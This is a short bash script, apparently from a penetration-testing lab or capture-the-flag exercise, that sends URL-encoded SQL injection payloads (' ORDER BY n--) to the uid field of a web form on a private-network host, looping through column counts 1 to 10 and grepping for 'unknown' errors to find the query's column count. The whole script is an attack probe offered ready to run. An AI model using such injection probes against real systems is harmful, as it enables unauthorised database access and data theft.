#!/usr/bin/bash

for i in $(seq 1 10); do
	curl -X POST http://192.168.191.19/ --data "uid=%27%20ORDER%20BY%20$i--%20%2F%2F" | grep -i 'unknown'
done